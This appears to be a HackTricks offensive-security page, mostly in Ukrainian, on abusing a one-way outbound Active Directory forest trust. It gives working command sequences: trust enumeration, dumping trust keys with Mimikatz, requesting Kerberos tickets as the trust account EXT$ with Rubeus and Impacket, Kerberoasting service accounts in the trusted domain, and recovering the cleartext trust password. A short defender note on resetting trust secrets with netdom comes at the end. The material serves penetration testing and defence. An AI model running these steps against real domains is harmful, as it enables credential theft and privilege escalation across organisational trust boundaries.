# External Forest Domain - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

У цьому сценарії **ваш домен** **довіряє** певні **привілеї** principals з **іншого домену/лісу**.

## Enumeration

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
Якщо у вас є доступний AD module, також безпосередньо перегляньте **Trusted Domain Object (TDO)**. Це дає вам сирі trust data на основі LDAP, які пізніше знадобляться, коли ви вирішуватимете, чи простіший шлях — це **FSP/group abuse** або **trust-account abuse**:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
Також слід перерахувати, де foreign principals із `CN=ForeignSecurityPrincipals` фактично отримали доступ. Типові варіанти:

- **Local admin** на сервері/DC у вашому поточному домені
- Членство в **custom domain group**, яка має ACLs над users/computers/GPOs
- Права на зміну **computer objects**, що згодом може стати [RBCD](resource-based-constrained-delegation.md), якщо конфігурація trust це дозволяє

## Trust Account Attack

Коли one-way trust створюється з domain/forest **B** до domain/forest **A** (**B trusts A**), у **A** створюється **trust account** для **B**. У outbound-trust view **A** це корисно, тому що якщо згодом ви скомпрометуєте **B** (the trusting side), ви можете витягнути там trust secret і автентифікуватися назад до **A** як `B$`.

Ключовий аспект тут полягає в тому, що пароль і Kerberos material для цього trust account можна витягнути з Domain Controller у **trusting** домені за допомогою:
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Це працює тому, що обліковий запис довіри, створений у **trusted** domain, є увімкненим principal, який отримує базові права звичайного domain user там. Цього часто достатньо, щоб почати enumerating LDAP, request tickets і знайти наступний шлях підвищення привілеїв.

У сценарії, де `ext.local` є **trusting** domain, а `root.local` є **trusted** domain, обліковий запис користувача з ім’ям `EXT$` створюється всередині `root.local`. Dumping trust keys з `ext.local` виявляє credentials, які можна використати як `root.local\EXT$` проти `root.local`:
```bash
lsadump::trust /patch
```
Після цього використайте витягнутий ключ **RC4**, щоб автентифікуватися як `root.local\EXT$` всередині `root.local`:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Тоді перелічи trusted domain як той principal, наприклад, через Kerberoasting високовартісного SPN у `root.local`:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### З Linux

Якщо ви відновили ключ облікового запису довіри **RC4**, та сама ідея працює з Linux через Impacket:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Якщо **RC4** не приймається, перейдіть на відновлений **cleartext password** (або похідні ключі **AES**) і повторно використайте звичайні робочі процеси [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) та [Kerberoast](kerberoast.md) з цього foothold.

### Key material gotchas

Не плутайте **trust keys** і **trust-account credentials**:

- У one-way trust обидві сторони зберігають **TDO**, але фактичний обліковий запис **`EXT$` user account існує лише в trusted domain**.
- Поточний пароль trust-account відображається в TDO trust secret (`NewPassword` / current trust key).
- **RC4** trust key — найпростіший артефакт для повторного використання в `asktgt` як trust account; у стандартних конфігураціях це зазвичай робочий enctype, бо в trust account часто порожній `msDS-SupportedEncryptionTypes`.
- Якщо ви мислите в термінах **AES trust keys**, пам’ятайте, що вони не взаємозамінні з AES keys trust-account, бо salts відрізняються.

Отже, для technique на цій сторінці краще використовувати або витягнутий **RC4** material, або відновлений **cleartext** password.

### Gathering cleartext trust password

У попередньому flow використовувався trust hash замість **cleartext password** (його також **dumped by mimikatz**).

Cleartext password можна отримати, перетворивши вміст \[ CLEAR ] з mimikatz із hexadecimal і видаливши null bytes `\x00`:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)

Іноді під час створення trust relationship користувач має вручну ввести password для trust. У цій демонстрації key — це початковий trust password, тому його можна прочитати людиною. Коли key ротуються (default: кожні 30 days), cleartext зазвичай перестає бути читабельним, але все ще технічно придатний до використання.

Cleartext password можна використати для звичайної authentication як trust account, як альтернативу запиту TGT за допомогою Kerberos secret key trust account. Тут виконується запит `root.local` з `ext.local` для members of `Domain Admins`:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)

### Practical limitations

> [!WARNING]
> Trust accounts — незручні principals. Interactive logons, такі як **RUNAS / console / RDP**, тут не є очікуваним шляхом, а спроби **NTLM** authentication можуть завершуватися з `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Плануйте **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast) замість цього.

### Persistence / cleanup note

Якщо defenders зрозуміють, що trusting domain було compromised, вони мають ротувати trust secret на **both sides** за допомогою `netdom trust ... /resetOneSide ...`. З точки зору operator це важливо, бо **manual reset негайно invalidates old trust material**, тоді як звичайна rotation trust-password зберігає current/previous values під час rollover.
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Посилання

- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
